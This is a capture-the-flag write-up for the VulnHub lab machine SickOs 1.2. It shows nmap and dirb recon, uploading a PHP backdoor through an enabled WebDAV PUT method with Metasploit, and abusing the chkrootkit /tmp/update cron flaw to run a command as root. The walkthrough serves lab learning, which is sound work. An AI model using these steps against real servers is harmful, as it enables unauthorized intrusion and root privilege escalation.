# SickOs1.1 Writeup

## Recon

nmap shows

```bash
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
```

seems there is a http server running which shows this:

![](OSCPSickOs12webpage.png)

let's start by checking if we can identify some subdirectories.

```bash
dirb http://<IP> 
```

this results in:

```bash
---- Scanning URL: http://192.168.56.103/ ----
+ http://192.168.56.103/index.php (CODE:200|SIZE:163)                                    
==> DIRECTORY: http://192.168.56.103/test/     
```

Seems like there is a listable /test directory (nothing could be found within)

we can check to see what HTTP methods this directory supports using

```bash
nmap --script http-methods --script-args http-methods.url-path='/test' <IP>
```

with as result:

```bash 
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test

```

It seems to allow some risky methods including PUT which might allow us to upload code and view it on the website (it also runs PHP-CGI).

metasploit allows us to easily upload some code 

```bash
msfconsole
use auxiliary/scanner/http/http_put
set RHOSTS <IP>
set FILENAME <filename>
set FILEDATA file:<filepath>
run
```

this will upload a php backdoor for us to use and recon the system
By checkin the cron files we can see what get's executed.
One of these is a Chkrootkit file. chkrootkit contains a vulnerability where it might execute whatever is in /tmp/update using root privileges.

by creating a file in /tmp/update we can get the flag

```bash
cat /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt > /home/flag.txt
```

then we need to wait a couple of minutes for it to execute and give us the flag
(don't forget to chmod +x the tmp file)

```bash
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```



